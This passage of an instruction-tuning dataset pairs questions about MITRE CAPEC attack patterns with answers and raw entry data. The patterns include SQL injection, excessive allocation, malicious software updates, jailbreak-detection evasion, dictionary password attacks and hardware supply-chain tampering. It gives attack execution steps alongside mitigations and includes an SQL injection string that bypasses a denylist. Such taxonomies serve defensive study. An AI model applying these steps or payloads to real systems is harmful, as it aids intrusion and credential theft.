                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.",
            "Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.",
            "Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application."
          ]
        },
        "Example_Instances": {
          "Example": "With PHP-Nuke versions 7.9 and earlier, an attacker can successfully access and modify data, including sensitive contents such as usernames and password hashes, and compromise the application through SQL Injection. The protection mechanism against SQL Injection employs a denylist approach to input validation. However, because of an improper denylist, it is possible to inject content such as \"foo'/**/UNION\" or \"foo UNION/**/\" to bypass validation and glean sensitive information from the database. See also: CVE-2006-5525"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "89"
            },
            {
              "@CWE_ID": "1286"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "19",
              "Entry_Name": "SQL Injection"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "SQL Injection"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-607",
            "@Section": "Testing for SQL Injection"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Excessive Allocation (CAPEC ID: 130), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.",
      "@Name": "Excessive Allocation (CAPEC ID: 130)",
      "attack_ptrn": {
        "@ID": "130",
        "@Name": "Excessive Allocation",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation."
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Resource Consumption",
            "Note": "A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Limit the amount of resources that are accessible to unprivileged users.",
            "Assume all input is malicious. Consider all potentially relevant properties when validating input.",
            "Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.",
            "Use resource-limiting settings, if possible."
          ]
        },
        "Example_Instances": {
          "Example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "404"
            },
            {
              "@CWE_ID": "770"
            },
            {
              "@CWE_ID": "1325"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1499.003",
              "Entry_Name": "Endpoint Denial of Service:Application Exhaustion Flood"
            },
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "10",
              "Entry_Name": "Denial of Service"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Malicious Software Update (CAPEC ID: 186)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Using an automated process to download and install dangerous code was key part of the NotPeyta attack [REF-697]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Using an automated process to download and install dangerous code was key part of the NotPeyta attack [REF-697]",
      "@Name": "Malicious Software Update (CAPEC ID: 186)",
      "attack_ptrn": {
        "@ID": "186",
        "@Name": "Malicious Software Update",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an adversary controlled source.",
        "Extended_Description": {
          "xhtml:p": [
            "Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an adversary to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity.",
            "As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source. Virtually all software requires frequent updates or patches, giving the adversary immense latitude when structuring the attack, as well as many targets of opportunity. Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters."
          ]
        },
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "184"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "98"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target] The adversary must first identify what they want their target to be. Because malicious software updates can be carried out in a variety of ways, the adversary will first not only identify a target program, but also what users they wish to target. This attack can be targeted (a particular user or group of users) or untargeted (many different users)."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Craft a deployment mechanism based on the target] The adversary must craft a deployment mechanism to deploy the malicious software update. This mechanism will differ based on if the attack is targeted or untargeted.",
              "Technique": [
                "Targeted attack: hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update.",
                "Targeted attack: Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update",
                "Untargeted attack: Spam the malicious update to as many users as possible through unsolicited email, instant messages, or social media messages.",
                "Untargeted attack: Send phishing emails to as many users as possible and pretend to be a legitimate source suggesting to download an important software update.",
                "Untargeted attack: Use trojans/botnets to aid in either of the two untargeted attacks."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Deploy malicious software update] Using the deployment mechanism from the previous step, the adversary gets a user to install the malicious software update."
            }
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "This attack requires advanced cyber capabilities"
          }
        },
        "Resources_Required": {
          "Resource": "Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the adversary to host a payload and then trigger the installation of the payload code."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Access Control",
              "Availability",
              "Confidentiality"
            ],
            "Impact": "Execute Unauthorized Commands",
            "Note": "Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials, enable a denial-of-service attack, or enable tracking."
          }
        },
        "Mitigations": {
          "Mitigation": "Validate software updates before installing."
        },
        "Example_Instances": {
          "Example": "Using an automated process to download and install dangerous code was key part of the NotPeyta attack [REF-697]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.002",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-697"
          }
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Notes"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Extended_Description, References, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Root/Jailbreak Detection Evasion via Debugging (CAPEC ID: 661)",
    "context": "",
    "output": "Possible examples: An adversary targets an iOS banking application in an attempt to compromise sensitive user data. The adversary launches the application with the iOS debugger and sets a breakpoint at the program entry point, after the application's signature has been verified. Next, the adversary dumps the memory region that contains the decrypted code from the address space of the binary. The 'Restrict' flag is then stripped from the application and the adversary resigns the application with a self-signed certificate. The application is now executed without the 'Restrict' flag, while trusting the self-signed certificate to be legitimate. However, the adversary is now able to evaded Jailbreak detection via code hooking or other methods and can glean user credentials and/or transaction details.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary targets an iOS banking application in an attempt to compromise sensitive user data. The adversary launches the application with the iOS debugger and sets a breakpoint at the program entry point, after the application's signature has been verified. Next, the adversary dumps the memory region that contains the decrypted code from the address space of the binary. The 'Restrict' flag is then stripped from the application and the adversary resigns the application with a self-signed certificate. The application is now executed without the 'Restrict' flag, while trusting the self-signed certificate to be legitimate. However, the adversary is now able to evaded Jailbreak detection via code hooking or other methods and can glean user credentials and/or transaction details.",
      "@Name": "Root/Jailbreak Detection Evasion via Debugging (CAPEC ID: 661)",
      "attack_ptrn": {
        "@ID": "661",
        "@Name": "Root/Jailbreak Detection Evasion via Debugging",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary inserts a debugger into the program entry point of a mobile application to modify the application binary, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Rooting/Jailbreaking a mobile device also provides users with access to system debuggers and disassemblers, which can be leveraged to exploit applications by dumping the application's memory at runtime in order to remove or bypass signature verification methods. This further allows the adversary to evade Root/Jailbreak detection mechanisms, which can result in execution of administrative commands, obtaining confidential data, impersonating legitimate users of the application, and more.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "121"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "68"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "660"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).",
              "Technique": "Search application stores for mobile applications worth exploiting"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Debug the target application] The adversary inserts the debugger into the program entry point of the mobile application, after the application's signature has been identified, to dump its memory contents.",
              "Technique": [
                "Insert the debugger at the mobile application's program entry point, after the application's signature has been identified.",
                "Dump the memory region containing the now decrypted code from the address space of the binary."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Remove application signature verification methods] Remove signature verification methods from the decrypted code and resign the application with a self-signed certificate."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Execute the application and evade Root/Jailbreak detection methods] The application executes with the self-signed certificate, while believing it contains a trusted certificate. This now allows the adversary to evade Root/Jailbreak detection via code hooking or other methods.",
              "Technique": "Optional: Hook code into the target application."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "A debugger must be able to be inserted into the targeted application."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Knowledge about Root/Jailbreak detection and evasion techniques."
            },
            {
              "@Level": "Medium",
              "#text": "Knowledge about runtime debugging."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have a Rooted/Jailbroken mobile device with debugging capabilities."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Integrity",
                "Authorization"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Through Root/Jailbreak Detection Evasion via Debugging, the adversary compromises the integrity of the application."
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
              ],
              "Impact": "Read Data",
              "Note": "An adversary may leverage Root/Jailbreak Detection Evasion via Debugging in order to obtain sensitive information."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Instantiate checks within the application code that ensures debuggers are not attached."
        },
        "Example_Instances": {
          "Example": "An adversary targets an iOS banking application in an attempt to compromise sensitive user data. The adversary launches the application with the iOS debugger and sets a breakpoint at the program entry point, after the application's signature has been verified. Next, the adversary dumps the memory region that contains the decrypted code from the address space of the binary. The 'Restrict' flag is then stripped from the application and the adversary resigns the application with a self-signed certificate. The application is now executed without the 'Restrict' flag, while trusting the self-signed certificate to be legitimate. However, the adversary is now able to evaded Jailbreak detection via code hooking or other methods and can glean user credentials and/or transaction details."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "489"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-625"
            },
            {
              "@External_Reference_ID": "REF-626"
            },
            {
              "@External_Reference_ID": "REF-627"
            },
            {
              "@External_Reference_ID": "REF-628"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-12-17"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Dictionary-based Password Attack (CAPEC ID: 16)",
    "context": "",
    "output": "Possible examples: A system user selects the word \"treacherous\" as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A system user selects the word \"treacherous\" as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account."
      ],
      "@Name": "Dictionary-based Password Attack (CAPEC ID: 16)",
      "attack_ptrn": {
        "@ID": "16",
        "@Name": "Dictionary-based Password Attack",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": [
            "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.",
            "Dictionary Attacks differ from similar attacks such as Password Spraying (CAPEC-565) and Credential Stuffing (CAPEC-600), since they leverage unknown username/password combinations and don't care about inducing account lockouts."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "49"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine application's/system's password policy] Determine the password policies of the target application/system.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks)."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Select dictionaries] Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.)",
              "Technique": [
                "Select dictionary based on particular users' preferred languages.",
                "Select dictionary based on the application/system's supported languages."
              ]
            },
            {
              "Step": "3",
              "Phase": "Explore",
              "Description": "[Determine username(s) to target] Determine username(s) whose passwords to crack.",
              "Technique": [
                "Obtain username(s) by sniffing network packets.",
                "Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not)",
                "Obtain usernames from filesystem (e.g. list of directories in C:\\Documents and Settings\\ in Windows, and list in /etc/passwd in UNIX-like systems)"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use dictionary to crack passwords.] Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.",
              "Technique": [
                "Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).",
                "Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s)."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system uses one factor password based authentication.",
            "The system does not have a sound password policy that is being enforced.",
            "The system does not implement an effective password throttling mechanism."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A variety of password cracking tools and dictionaries are available to launch this type of an attack."
          }
        },
        "Resources_Required": {
          "Resource": "A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack."
        },
        "Indicators": {
          "Indicator": "Many invalid login attempts are coming from the same machine (same IP address) or for the same log in name. The login attempts use passwords that are dictionary words."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.",
            "Leverage multi-factor authentication for all authentication services."
          ]
        },
        "Example_Instances": {
          "Example": [
            "A system user selects the word \"treacherous\" as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.",
            {
              "xhtml:p": [
                "The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks.",
                "Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server.",
                "Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques."
              ],
              "#text": "See also: CVE-2003-1096"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Description, Mitigations, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Malicious Hardware Component Replacement (CAPEC ID: 522)",
    "context": "",
    "output": "Possible examples: During shipment the adversary is able to intercept a system that has been purchased by the victim, and replaces a math processor card that functions just like the original, but contains advanced malicious capability. Once deployed, the system functions as normal, but allows for the adversary to remotely communicate with the system and use it as a conduit for additional compromise within the victim's environment.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "During shipment the adversary is able to intercept a system that has been purchased by the victim, and replaces a math processor card that functions just like the original, but contains advanced malicious capability. Once deployed, the system functions as normal, but allows for the adversary to remotely communicate with the system and use it as a conduit for additional compromise within the victim's environment.",
      "@Name": "Malicious Hardware Component Replacement (CAPEC ID: 522)",
      "attack_ptrn": {
        "@ID": "522",
        "@Name": "Malicious Hardware Component Replacement",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "439"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Target Hardware] The adversary must first identify a system that they wish to target, and a specific hardware component that they can swap out with a malicious replacement.",
              "Technique": [
                "Look for datasheets containing the system schematics that can help identify possible target hardware.",
                "Procure a system and inspect it manually, looking for possible hardware component targets. Search for manufacturer IDs on hardware chips or FCC IDs on wireless chips to determine their functionality."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.",
              "Technique": [
                "Procure a system and observe the steps it takes in the shipment process.",
                "Identify possible warehouses that systems are stored after manufacturing."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Test a Malicious Component Replacement] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.",
              "Technique": [
                "Design a malicious hardware component that will perform the same functionality as the target component, but also contains additional functionality.",
                "Obtain already designed malicious components that just need to be placed into the system."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Substitute Components in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary substitutes the malicious component for the targeted component. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Physical access to the system after it has left the manufacturer but before it is deployed at the victim location."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Advanced knowledge of the design of the system."
            },
            {
              "@Level": "High",
              "#text": "Hardware creation and manufacture of replacement components."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Ensure that all contractors and sub-suppliers use trusted means of shipping (e.g., bonded/cleared/vetted and insured couriers) to ensure that components, once purchased, are not subject to compromise during their delivery.",
            "Prevent or detect tampering with critical hardware or firmware components while in transit through use of state-of-the-art anti-tamper devices.",
            "Use tamper-resistant and tamper-evident packaging when shipping critical components (e.g., plastic coating for circuit boards, tamper tape, paint, sensors, and/or seals for cases and containers) and inspect received system components for evidence of tampering."
          ]
        },
        "Example_Instances": {
          "Example": "During shipment the adversary is able to intercept a system that has been purchased by the victim, and replaces a math processor card that functions just like the original, but contains advanced malicious capability. Once deployed, the system functions as normal, but allows for the adversary to remotely communicate with the system and use it as a conduit for additional compromise within the victim's environment."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-712"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
